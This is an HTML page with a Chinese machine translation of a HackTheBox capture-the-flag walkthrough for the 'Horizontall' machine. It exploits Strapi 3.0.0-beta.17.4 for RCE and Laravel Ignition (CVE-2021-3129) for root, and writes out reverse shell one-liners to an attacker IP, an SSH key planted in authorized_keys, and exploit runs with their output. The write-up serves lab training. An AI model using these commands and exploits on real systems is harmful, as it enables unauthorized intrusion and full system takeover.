<html>
<head>
<title>Horizontall from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的Horizontall详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/horizontall-from-hackthebox-detailed-walkthrough-f66f7193e70?source=collection_archive---------4-----------------------#2022-01-30">https://infosecwriteups.com/horizontall-from-hackthebox-detailed-walkthrough-f66f7193e70?source=collection_archive---------4-----------------------#2022-01-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="6e11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="6578" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/1aabbb1744d838573c3ceddd5ac829a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*2qhD1rtOD1N4R8kP.png"/></div></figure><p id="5b62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Horizontall在HackTheBox上被评为易机。我们最初的扫描显示只有两个开放的端口。在端口80上只有一个静态网站，但是vhosts的枚举发现了一个隐藏的子域。需要进一步搜索以发现子域上的文件夹。从那里我们发现了一个易受攻击的Strapi版本，并使用公共漏洞来获得初始访问权限。LinPEAS揭示了一个可疑端口在机器内部运行。在确认它是Laravel之后，我们建立了一个SSH隧道从Kali访问它。通过检查，我们发现这是Laravel的一个易受攻击的版本，因此我们使用一个公共漏洞来获取根标志。</p><p id="e5f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需的技能是网络和操作系统枚举。学到的技能是寻找和利用公共漏洞来获得访问权。</p><div class="lr ls gp gr lt lu"><a href="https://www.hackthebox.eu/home/machines/profile/374" rel="noopener  ugc nofollow" target="_blank"><div class="lv ab fo"><div class="lw ab lx cl cj ly"><h2 class="bd ir gy z fp lz fr fs ma fu fw ip bi translated">破解盒子::渗透测试实验室—horizontal</h2><div class="mb l"><h3 class="bd b gy z fp lz fr fs ma fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mc l"><p class="bd b dl z fp lz fr fs ma fu fw dk translated">www.hackthebox.eu</p></div></div><div class="md l"><div class="me l mf mg mh md mi lp lu"/></div></div></a></div><h1 id="f054" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="4c46" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi mo"><img src="../Images/e9bf64c6b12efbed08a20925c1d0b4b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XpebjqD40-qQFZVd67KDgA.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><p id="476e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先将机器的IP地址添加到我们的hosts文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4679" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall]<br/>└─# echo "10.10.11.105 horizontall.htb" &gt;&gt; /etc/hosts</span></pre><p id="cd54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在只看端口80:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/5acbe3a85d964ff863386d7348e0a868.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/0*Ov6l-GaWeKTCziK_.png"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">Horizontall网站</figcaption></figure><p id="15f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们发现一个静态网页，源代码中没有任何有趣的内容。让我们寻找隐藏的文件:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi ni"><img src="../Images/eaafc10286f16d15f442bc13165f9308.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RAowOFQxAONywdAYJvODSQ.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">盒子的Feroxbuster扫描</figcaption></figure><h1 id="d9cd" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">子域枚举</h1><p id="2f6f" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">这些文件夹中没有突出的内容，请查找子域:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nj"><img src="../Images/04cb404709f19aa8c89feb835ec7e324.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ouesz1nPc_DOl66JAPW1-A.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">vhosts的Gobuster扫描</figcaption></figure><p id="45d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们发现了一个名为api-prod的子域，添加到hosts文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ef5c" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# echo "10.10.11.105 api-prod.horizontall.htb" &gt;&gt; /etc/hosts</span></pre><p id="144c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看看这个子域上的网站，它只是一个空白的页面。Wappalyzer显示它将Strapi视为底层CMS:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/542df826f650f21aa2ec94dcb26da6bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/0*ldJ_BkUSaXOut-3U.png"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">api-prod站点的Wappalyzer信息</figcaption></figure><h1 id="8afe" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Web枚举</h1><p id="e836" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">让我们再列举一些:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nl"><img src="../Images/25aefd5a3c5e563a3b98f35d2ec4d701.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fFCw2wqhJFzpeWcyN1zDzw.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">api-prod子域的Feroxbuster扫描</figcaption></figure><p id="0171" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这还差不多！</p><p id="dfd6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看评论文件夹，我们看到有一个API接口:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/cbb08b5d08fe85a18869c7d860b3c355.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/0*xBQRgzivaH7zL_F5.png"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">api-prod站点的JSON视图</figcaption></figure><h1 id="6a9b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Strapi登录</h1><p id="ad6a" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">查看admin文件夹，我们看到一个登录名:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/3549e38a6391b84c2eb3a73ca238e44a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1260/format:webp/0*Lnq_maIEkuMLNAbf.png"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">Strapi登录页面</figcaption></figure><p id="2607" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">快速搜索一下谷歌就会发现这个版本是这样的:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="7304" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall]<br/>└─# curl http://api-prod.horizontall.htb/admin/strapiVersion<br/>{"strapiVersion":"3.0.0-beta.17.4"}</span></pre><p id="fe7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查Exploit-DB发现一个未经验证的RCE:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi no"><img src="../Images/043a697901c08a124a16519c2aeec3ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Va7FWxtQAHkdTnQhh8X3bw.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">Searchsploit扫描strapi漏洞</figcaption></figure><p id="9990" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们抓住最后一个漏洞来看看:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b483" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall]<br/>└─# searchsploit -m multiple/webapps/50239.py<br/>  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE)<br/>      URL: https://www.exploit-db.com/exploits/50239<br/>     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py<br/>File Type: Python script, ASCII text executable<br/>Copied to: /root/htb/horizontall/50239.py</span></pre><h1 id="ba0a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">剥削斯特拉皮</h1><p id="5f72" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">阅读脚本，我们只需执行它并指向网站:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="844f" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall]<br/>└─# python3 50239.py http://api-prod.horizontall.htb <br/>[+] Checking Strapi CMS Version running<br/>[+] Seems like the exploit will work!!!<br/>[+] Executing exploit<br/><br/>[+] Password reset was successfully<br/>[+] Your email is: admin@horizontall.htb<br/>[+] Your new credentials are: admin:SuperStrongPassword1<br/>[+] Your authenticated JSON Web Token: eyJhbGci&lt;SNIP&gt;swArk82os<br/>$&gt;</span></pre><p id="ce9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该漏洞重置了管理员用户的密码，并给了我们一个命令提示:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6d9e" class="nc km iq my b gy nd ne l nf ng">$&gt; whoami<br/>[+] Triggering Remote code execution<br/>[*] Remember this is a blind RCE don't expect to see output<br/>{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}</span></pre><p id="a570" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好吧，所以我不能用它来输出到终端，让我们尝试一个外壳:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="7c82" class="nc km iq my b gy nd ne l nf ng">$&gt; bash -i &gt;&amp; /dev/tcp/10.10.14.214/4444 0&gt;&amp;1<br/>[+] Triggering Remote code execution<br/>[*] Remember this is a blind RCE don't expect to see output<br/>{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}</span></pre><h1 id="3fdb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反向外壳</h1><p id="e916" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我没有从那一个得到连接，尝试另一个类型:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="aa2c" class="nc km iq my b gy nd ne l nf ng">$&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.214 4444 &gt;/tmp/f<br/>[+] Triggering Remote code executin<br/>[*] Rember this is a blind RCE don't expect to see output</span></pre><p id="dd86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一次我们抓住了贝壳:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="8bd9" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.14.214] from (UNKNOWN) [10.10.11.105] 55312<br/>/bin/sh: 0: can't access tty; job control turned off</span></pre><p id="2afd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先升级到合适的终端:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4ef7" class="nc km iq my b gy nd ne l nf ng">$ python -c 'import pty;pty.spawn("/bin/bash")'<br/>strapi@horizontall:~/myapi$ ^Z<br/>zsh: suspended  nc -nlvp 4444<br/>┌──(root💀kali)-[~]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 4444<br/>strapi@horizontall:~/myapi$</span></pre><h1 id="50c3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户标志</h1><p id="e9f6" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我们是谁？我们能得到用户标志吗:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="cf62" class="nc km iq my b gy nd ne l nf ng">strapi@horizontall:~/myapi$ id<br/>uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)<br/><br/>strapi@horizontall:~/myapi$ ls -l /home<br/>drwxr-xr-x 8 developer developer 4096 Aug  2 12:07 developer<br/><br/>strapi@horizontall:~/myapi$ ls -l /home/developer/<br/>-rw-rw----  1 developer developer 58460 May 26 11:59 composer-setup.php<br/>drwx------ 12 developer developer  4096 May 26 12:21 myproject<br/>-r--r--r--  1 developer developer    33 Sep 30 08:59 user.txt<br/><br/>strapi@horizontall:~/myapi$ cat /home/developer/user.txt <br/>&lt;HIDDEN&gt;</span></pre><h1 id="f89e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">权限提升</h1><p id="171d" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">好吧，那很简单！关于特权升级，让我们把LinPEAS拉过来加速一下。如果需要，从<a class="ae np" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" rel="noopener ugc nofollow" target="_blank">这里</a>获取最新版本。在Kali上启动一个web服务器来托管它:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b631" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall]<br/>└─# python3 -m http.server 80<br/>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span></pre><p id="39fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到盒子，拉过来运行:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="c3da" class="nc km iq my b gy nd ne l nf ng">strapi@horizontall:/dev/shm$ wget http://10.10.14.214/linpeas.sh<br/>--2021-09-30 16:23:47--  http://10.10.14.214/linpeas.sh<br/>Connecting to 10.10.14.214:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 473371 (462K) [text/x-sh]<br/>Saving to: ‘linpeas.sh’<br/>linpeas.sh.1    100%[=============&gt;] 462.28K  2.05MB/s    in 0.2s    <br/>2021-09-30 16:23:47 (2.05 MB/s) - ‘linpeas.sh’ saved [473371/473371]<br/><br/>strapi@horizontall:/dev/shm$ chmod +x linpeas.sh       <br/><br/>strapi@horizontall:/dev/shm$ ./linpeas.sh &gt; linpeas.txt<br/>grep: write error: Broken pipe<br/>sh: printf: I/O error<br/>grep: write error: Broken pipe<br/>. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . </span></pre><p id="6df8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这需要一段时间才能完成。输出很长，但是LinPEAS用红色突出显示了有趣的区域，所以这一部分很突出:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4642" class="nc km iq my b gy nd ne l nf ng">╔══════════╣ Active Ports<br/>╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports<br/>tcp        0      0 0.0.0.0:80          0.0.0.0:*       LISTEN  -<br/>tcp        0      0 0.0.0.0:22          0.0.0.0:*       LISTEN  -<br/>tcp        0      0 127.0.0.1:1337      0.0.0.0:*       LISTEN  1830/node /usr/bin/<br/>tcp        0      0 127.0.0.1:8000      0.0.0.0:*       LISTEN  -                   <br/>tcp        0      0 127.0.0.1:3306      0.0.0.0:*       LISTEN  -                   <br/>tcp6       0      0 :::80               :::*            LISTEN  -                   <br/>tcp6       0      0 :::22               :::*            LISTEN  -</span></pre><p id="83af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以通过使用netstat更快地找到它:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nq"><img src="../Images/09b11c9129ac6cb2fdbe722f67451f18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aNJ-Siv-Jxa_EqeqB0ZR8A.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">显示开放端口的netstat</figcaption></figure><h1 id="3595" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Laravel检测</h1><p id="e75b" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">哦好吧。让我们从机器上使用curl来看看本地端口8000:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b4c1" class="nc km iq my b gy nd ne l nf ng">strapi@horizontall:~/myapi$ curl -sSL -D - http://localhost:8000 <br/>-o /dev/null<br/>HTTP/1.1 200 OK<br/>Host: localhost:8000<br/>Date: Thu, 30 Sep 2021 20:45:41 GMT<br/>Connection: close<br/>X-Powered-By: PHP/7.4.22<br/>Content-Type: text/html; charset=UTF-8<br/>Cache-Control: no-cache, private<br/>Date: Thu, 30 Sep 2021 20:45:41 GMT</span></pre><p id="447f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">标题显示有一个web服务器运行在这个内部可访问的端口上。如果我们请求默认页面，我们可以选择一个叫做Laravel的东西:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nr"><img src="../Images/f37acd123517a110ed14242a3e1eaa45.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fyWHPy9RIs73pQYkRWbRRg.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">使用curl查看本地主机上的网页</figcaption></figure><h1 id="1795" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SSH端口转发</h1><p id="3c5c" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">因此，我们有一个运行在内部端口上的网站，这意味着我们需要使用Kali上的端口转发来允许我们从本地浏览器访问该网站。我们以前在许多机器上见过这种情况，第一步是创建一个SSH密钥对:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ee4d" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall]<br/>└─# ssh-keygen          <br/>Generating public/private rsa key pair.<br/>Enter file in which to save the key (/root/.ssh/id_rsa): /root/htb/horizontall/id_rsa<br/>Enter passphrase (empty for no passphrase): <br/>Enter same passphrase again: <br/>Your identification has been saved in /root/htb/horizontall/id_rsa<br/>Your public key has been saved in /root/htb/horizontall/id_rsa.pub<br/>The key fingerprint is:<br/>SHA256:roCdl+6laUp63MTjLU4+V3J9C1XAAhjx8mrgmdhpFco root@kali<br/>The key's randomart image is:<br/>+---[RSA 3072]----+<br/>|        o+.. ... |<br/>|        ..  . . .|<br/>|        o .  . . |<br/>|     . . +    .  |<br/>|     .E S .. .   |<br/>|   o =+O..o o .  |<br/>|  ..*+@o=+   o . |<br/>|   ooB**o     .  |<br/>|  ...=O+         |<br/>+----[SHA256]-----+</span></pre><p id="9c41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获取公钥并创建一个echo语句，我们可以将它粘贴到机器上:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2a19" class="nc km iq my b gy nd ne l nf ng">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg0PqOGRanCQeaQ8E&lt;SNIP&gt;<br/>gYbDv/iV4j/BDTJCrtfwlbskA0qveVguz15rTc09Fr4NE= root@kali" <br/>&gt;&gt; authorized_keys</span></pre><p id="529a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这只是将id_rsa.pub文件的内容回显到一个名为authorized_keys的文件中。将此复制到剪贴板，然后切换回框:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9c2f" class="nc km iq my b gy nd ne l nf ng">strapi@horizontall:~$ cd .ssh/<br/>strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg0PqOGRanCQeaQ8E&lt;SNIP&gt;<br/>gYbDv/iV4j/BDTJCrtfwlbskA0qveVguz15rTc09Fr4NE= root@kali" <br/>&gt;&gt; authorized_keys</span></pre><p id="67d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用机器上authorized_keys文件中Kali的公钥，我们现在可以在用户strapi设置端口转发的同时进行SSH:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="bf9e" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall]<br/>└─# ssh -i id_rsa -L 8000:localhost:8000 strapi@10.10.11.105<br/><br/>Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)<br/>Last login: Thu Sep 30 19:55:29 2021 from 10.10.14.210<br/>$</span></pre><h1 id="1a8a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">拉勒韦尔漏洞利用</h1><p id="b2eb" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">上面的命令只是说，在端口8000上本地接收的任何流量都通过SSH转发到端口8000上的box。现在，我们可以使用Kali上的本地浏览器访问盒子上的网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi ns"><img src="../Images/27e11f2bfee64e9d897a7d303becd7ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*p2qX_mLibig9siAX.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">Laravel网站</figcaption></figure><p id="7d2f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看该网站，我们可以确认它运行的是Laravel v8 (PHP v7.4.18)。搜索漏洞发现<a class="ae np" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129" rel="noopener ugc nofollow" target="_blank">这个</a> CVE说:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="085e" class="nc km iq my b gy nd ne l nf ng">Ignition before 2.5.2, as used in Laravel and other products,<br/>allows unauthenticated remote attackers to execute arbitrary code <br/>because of insecure usage of file_get_contents() and file_put_contents().<br/>This is exploitable on sites using debug mode with Laravel before 8.4.2.</span></pre><p id="4acd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在8.4.2之前的版本上，在GitHub上看一下就发现了<a class="ae np" href="https://github.com/nth347/CVE-2021-3129_exploit" rel="noopener ugc nofollow" target="_blank">这个</a> POC。我们简单地克隆并在机器上运行它，让我们来试试:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d789" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall]<br/>└─# git clone https://github.com/nth347/CVE-2021-3129_exploit.git<br/>Cloning into 'CVE-2021-3129_exploit'...<br/>remote: Enumerating objects: 9, done.<br/>remote: Counting objects: 100% (9/9), done.<br/>remote: Compressing objects: 100% (8/8), done.<br/>remote: Total 9 (delta 1), reused 3 (delta 0), pack-reused 0<br/>Receiving objects: 100% (9/9), done.<br/>Resolving deltas: 100% (1/1), done.<br/><br/>┌──(root💀kali)-[~/htb/horizontall]<br/>└─# cd CVE-2021-3129_exploit<br/><br/>┌──(root💀kali)-[~/htb/horizontall/CVE-2021-3129_exploit]<br/>└─# chmod +x exploit.py<br/><br/>┌──(root💀kali)-[~/htb/horizontall/CVE-2021-3129_exploit]<br/>└─# ./exploit.py http://localhost:8000 Monolog/RCE1 id<br/>[i] Trying to clear logs<br/>[+] Logs cleared<br/>[i] PHPGGC not found. Cloning it<br/>Cloning into 'phpggc'...<br/>remote: Enumerating objects: 2598, done.<br/>remote: Counting objects: 100% (940/940), done.<br/>remote: Compressing objects: 100% (528/528), done.<br/>remote: Total 2598 (delta 379), reused 822 (delta 287), done.<br/>Receiving objects: 100% (2598/2598), 390.29 KiB | 540.00 KiB/s<br/>Resolving deltas: 100% (1021/1021), done.<br/>[+] Successfully converted logs to PHAR<br/>[+] PHAR deserialized. Exploited<br/><br/>uid=0(root) gid=0(root) groups=0(root)<br/><br/>[i] Trying to clear logs<br/>[+] Logs cleared</span></pre><h1 id="4664" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="2f80" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">这很好也很简单。漏洞运行并给了我们根id。让我们抓住旗子:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="af24" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/horizontall/CVE-2021-3129_exploit]<br/>└─# ./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"<br/>[i] Trying to clear logs<br/>[+] Logs cleared<br/>[+] PHPGGC found. Generating payload and deploy it to the target<br/>[+] Successfully converted logs to PHAR<br/>[+] PHAR deserialized. Exploited<br/><br/>a&lt;HIDDEN&gt;6<br/><br/>[i] Trying to clear logs<br/>[+] Logs cleared</span></pre><p id="67cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那是一个有趣的盒子，我希望你喜欢它。</p><p id="ae56" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下次见。</p></div><div class="ab cl nt nu hu nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="ij ik il im in"><p id="6fc5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx 